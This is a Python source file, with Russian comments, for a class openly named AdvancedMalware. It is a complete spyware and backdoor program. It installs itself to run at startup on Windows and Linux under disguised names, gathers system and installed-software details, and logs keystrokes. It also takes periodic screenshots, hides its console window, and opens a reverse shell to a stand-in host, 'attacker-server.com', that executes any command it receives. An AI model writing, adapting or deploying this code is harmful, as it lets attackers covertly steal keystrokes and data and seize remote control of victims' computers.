import os
import sys
import socket
import platform
import threading
import subprocess
from datetime import datetime
from pynput import keyboard

class AdvancedMalware:
    def __init__(self):
        self.log_file = "system_log.txt"
        self.keylog_file = "keylog.txt"
        self.host = "attacker-server.com"
        self.port = 4444
        
    def persist(self):
        """Добавляет автозагрузку в зависимости от ОС"""
        system = platform.system()
        
        if system == "Windows":
            import winreg
            key = winreg.HKEY_CURRENT_USER
            key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
            
            try:
                reg_key = winreg.OpenKey(key, key_path, 0, winreg.KEY_WRITE)
                winreg.SetValueEx(reg_key, "SystemUpdate", 0, winreg.REG_SZ, sys.executable)
                winreg.CloseKey(reg_key)
            except:
                pass
                
        elif system == "Linux":
            autostart_path = os.path.expanduser("~/.config/autostart/malware.desktop")
            desktop_entry = f"""[Desktop Entry]
Type=Application
Name=System Monitor
Exec={sys.executable}
Hidden=true"""
            
            with open(autostart_path, 'w') as f:
                f.write(desktop_entry)
                
    def collect_system_info(self):
        """Собирает детальную информацию о системе"""
        info = []
        info.append(f"=== System Information ===\n")
        info.append(f"Time: {datetime.now()}\n")
        info.append(f"OS: {platform.system()} {platform.release()}\n")
        info.append(f"Version: {platform.version()}\n")
        info.append(f"Architecture: {platform.architecture()[0]}\n")
        info.append(f"Processor: {platform.processor()}\n")
        info.append(f"Hostname: {socket.gethostname()}\n")
        
        # Сетевые интерфейсы
        try:
            info.append(f"\n=== Network Interfaces ===\n")
            import netifaces
            for interface in netifaces.interfaces():
                addrs = netifaces.ifaddresses(interface)
                if netifaces.AF_INET in addrs:
                    for addr in addrs[netifaces.AF_INET]:
                        info.append(f"{interface}: {addr['addr']}\n")
        except:
            pass
            
        # Установленные программы (Windows)
        if platform.system() == "Windows":
            try:
                import winreg
                info.append(f"\n=== Installed Programs ===\n")
                key = winreg.HKEY_LOCAL_MACHINE
                subkey = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall"
                
                with winreg.OpenKey(key, subkey) as reg_key:
                    for i in range(0, winreg.QueryInfoKey(reg_key)[0]):
                        try:
                            subkey_name = winreg.EnumKey(reg_key, i)
                            with winreg.OpenKey(key, f"{subkey}\\{subkey_name}") as program_key:
                                try:
                                    name = winreg.QueryValueEx(program_key, "DisplayName")[0]
                                    info.append(f"{name}\n")
                                except:
                                    pass
                        except:
                            pass
            except:
                pass
                
        with open(self.log_file, 'a') as f:
            f.writelines(info)
            
    def keylogger(self):
        """Логирует нажатия клавиш"""
        def on_press(key):
            try:
                with open(self.keylog_file, 'a') as f:
                    f.write(f"{datetime.now()}: {key.char}\n")
            except AttributeError:
                with open(self.keylog_file, 'a') as f:
                    f.write(f"{datetime.now()}: {key}\n")
                    
        listener = keyboard.Listener(on_press=on_press)
        listener.start()
        
    def create_backdoor(self):
        """Создает обратное соединение"""
        def connect():
            while True:
                try:
                    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    client.connect((self.host, self.port))
                    
                    while True:
                        command = client.recv(1024).decode()
                        if command.lower() == "exit":
                            break
                            
                        output = subprocess.run(command, shell=True, 
                                              capture_output=True, text=True)
                        response = output.stdout + output.stderr
                        client.send(response.encode())
                        
                    client.close()
                except:
                    import time
                    time.sleep(60)  # Переподключение через 60 секунд
                    
        thread = threading.Thread(target=connect)
        thread.daemon = True
        thread.start()
        
    def screenshot(self):
        """Делает скриншот экрана"""
        try:
            if platform.system() == "Windows":
                import pyautogui
                screenshot = pyautogui.screenshot()
                screenshot.save("screenshot.png")
        except:
            pass
            
    def run(self):
        """Запускает все компоненты"""
        # Персистентность
        self.persist()
        
        # Сбор информации
        self.collect_system_info()
        
        # Логирование клавиш в отдельном потоке
        keylog_thread = threading.Thread(target=self.keylogger)
        keylog_thread.daemon = True
        keylog_thread.start()
        
        # Бэкдор в отдельном потоке
        backdoor_thread = threading.Thread(target=self.create_backdoor)
        backdoor_thread.daemon = True
        backdoor_thread.start()
        
        # Периодические скриншоты
        def periodic_screenshot():
            import time
            while True:
                self.screenshot()
                time.sleep(300)  # Каждые 5 минут
                
        screenshot_thread = threading.Thread(target=periodic_screenshot)
        screenshot_thread.daemon = True
        screenshot_thread.start()
        
        # Бесконечный цикл для поддержания работы
        while True:
            import time
            time.sleep(3600)  # Проверка каждый час

if __name__ == "__main__":
    malware = AdvancedMalware()
    
    # Скрытие окна (Windows)
    if platform.system() == "Windows":
        import ctypes
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
        
    malware.run()

}